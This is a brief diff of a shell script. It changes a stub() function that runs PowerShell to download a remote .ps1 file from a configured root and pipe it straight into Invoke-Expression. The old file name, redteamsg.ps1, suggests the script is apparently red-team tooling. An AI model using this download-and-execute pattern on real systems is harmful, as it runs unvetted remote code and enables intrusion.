@@ -48,7 +48,7 @@ function setup() {
 }
 
 function stub() {
-    pwsh -Command "iwr ${GITHUB_ROOT}redteamsg.ps1 | iex ${PUBLIC_IP}"
+    pwsh -Command "iwr ${GITHUB_ROOT}stub.ps1 | iex ${PUBLIC_IP}"
 }
 case "${1}" in
 
